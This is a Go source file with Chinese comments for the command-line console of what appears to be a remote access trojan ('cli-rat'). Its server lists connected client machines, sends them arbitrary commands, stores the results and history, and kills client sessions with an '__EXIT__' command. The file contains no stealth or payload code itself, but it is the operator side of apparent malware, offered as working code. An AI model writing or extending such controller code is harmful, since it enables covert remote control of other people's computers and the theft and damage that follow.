// Package cli 提供命令行接口
// 负责处理服务端的所有命令行操作
package cli

import (
	"fmt"
	"time"

	"cli-rat/pkg/process"
	"cli-rat/pkg/storage"
	"cli-rat/server/handlers"
)

// CLI 命令行接口结构体
// 封装了所有命令行操作
type CLI struct {
	server *handlers.Server // HTTP服务器实例
}

// New 创建新的命令行接口实例
// server: HTTP服务器实例
func New(server *handlers.Server) *CLI {
	return &CLI{server: server}
}

// Help 显示帮助信息
// 打印所有可用命令及其用法
func (c *CLI) Help() {
	fmt.Println("=== 服务端命令 ===")
	fmt.Println("用法: server.exe <command> [args]")
	fmt.Println()
	fmt.Println("启动/停止服务端:")
	fmt.Println("  server.exe -init                 启动服务端（后台运行）")
	fmt.Println("  server.exe -init -ip 0.0.0.0 -port 9090  自定义监听地址")
	fmt.Println("  server.exe stop                  停止服务端")
	fmt.Println("  server.exe status                检查服务端运行状态")
	fmt.Println()
	fmt.Println("命令:")
	fmt.Println("  list                     查看在线客户端")
	fmt.Println("  send <id> <cmd>         发送命令给客户端")
	fmt.Println("  kill <id>                断开客户端连接")
	fmt.Println("  history                  查看命令历史")
	fmt.Println("  show <id>                查看命令详情")
	fmt.Println("  help                     显示帮助")
}

// Status 检查服务端运行状态
// 显示PID和监听地址信息
func (c *CLI) Status() {
	// 加载PID
	pid, err := process.LoadPID()
	if err != nil {
		fmt.Println("状态: 未运行")
		fmt.Println("服务端未启动或已停止")
		return
	}

	// 检查进程是否存在
	_, err = process.FindProcess(pid)
	if err != nil {
		fmt.Println("状态: 未运行")
		fmt.Println("PID文件存在但进程已退出")
		process.RemovePID()
		return
	}

	// 服务端正在运行
	fmt.Println("状态: 运行中")
	fmt.Printf("PID: %d\n", pid)
	fmt.Printf("地址: %s\n", c.server.ListenAddr())
}

// ListClients 列出所有在线客户端
// 显示客户端ID、地址和最后活跃时间
func (c *CLI) ListClients() {
	clients := c.server.ListClients()
	if len(clients) == 0 {
		fmt.Println("暂无在线客户端")
	} else {
		for i, c := range clients {
			fmt.Printf("[%d] %s (%s) 最后活跃: %s\n",
				i+1, c.ID, c.Address, c.LastPoll.Format("2006-01-02 15:04:05"))
		}
	}
}

// SendCommand 向指定客户端发送命令
// clientID: 目标客户端ID
// cmdContent: 命令内容
// 返回错误信息（如果发送失败）
func (c *CLI) SendCommand(clientID, cmdContent string) error {
	_, err := c.server.SendCommand(clientID, cmdContent)
	if err != nil {
		return err
	}
	fmt.Println("命令已发送")
	return nil
}

// History 查看命令执行历史
// 显示最近的命令记录（最多10条）
func (c *CLI) History() {
	commands := storage.ListCommands()
	if len(commands) == 0 {
		fmt.Println("暂无命令记录")
	} else {
		fmt.Println("=== 最近10条命令 ===")
		for i, c := range commands {
			fmt.Printf("[%d] %s -> %s 状态: %s\n",
				i+1, c.ID, c.Content, c.Status)
		}
	}
}

// ShowCommand 查看命令详情
// cmdID: 命令ID
// 显示命令的完整信息，包括执行结果
func (c *CLI) ShowCommand(cmdID string) {
	cmd := storage.GetCommandByID(cmdID)
	if cmd == nil {
		fmt.Println("命令不存在")
		return
	}
	fmt.Printf("ID: %s\n", cmd.ID)
	fmt.Printf("内容: %s\n", cmd.Content)
	fmt.Printf("客户端: %s\n", cmd.ClientID)
	fmt.Printf("状态: %s\n", cmd.Status)
	fmt.Printf("创建时间: %s\n", cmd.CreatedAt.Format("2006-01-02 15:04:05"))
	if !cmd.CompletedAt.IsZero() {
		fmt.Printf("完成时间: %s\n", cmd.CompletedAt.Format("2006-01-02 15:04:05"))
	}
	if cmd.Result != "" {
		fmt.Printf("结果:\n%s\n", cmd.Result)
	}
}

// KillClient 断开客户端连接
// clientID: 要断开的客户端ID
// 流程：先发送 __EXIT__ 命令，等待客户端执行，然后从列表中移除
func (c *CLI) KillClient(clientID string) error {
	// 检查客户端是否存在
	client := c.server.GetClient(clientID)
	if client == nil {
		return fmt.Errorf("客户端不存在: %s", clientID)
	}

	// 发送退出命令
	cmd, err := c.server.SendCommand(clientID, "__EXIT__")
	if err != nil {
		return fmt.Errorf("发送退出命令失败: %v", err)
	}

	// 等待客户端执行退出命令（最多5秒）
	fmt.Printf("[等待] 等待客户端退出...\n")
	for i := 0; i < 10; i++ {
		time.Sleep(500 * time.Millisecond)
		updatedCmd := storage.GetCommandByID(cmd.ID)
		if updatedCmd != nil && (updatedCmd.Status == "completed" || updatedCmd.Status == "failed") {
			break
		}
	}

	// 从列表中移除客户端
	if c.server.RemoveClient(clientID) {
		fmt.Printf("[断开] 客户端已断开连接: %s (%s)\n", clientID, client.Name)
		return nil
	}

	return fmt.Errorf("无法移除客户端: %s", clientID)
}

// Stop 停止服务端
// 杀死服务端进程并清理相关文件
func (c *CLI) Stop() error {
	// 加载PID
	pid, err := process.LoadPID()
	if err != nil {
		return fmt.Errorf("服务端未运行")
	}

	// 杀死进程
	if err := process.KillProcess(pid); err != nil {
		process.RemovePID()
		return fmt.Errorf("找不到服务端进程")
	}

	// 清理文件
	process.RemovePID()
	process.ReleaseLock()
	fmt.Println("=== 服务端已停止 ===")
	return nil
}
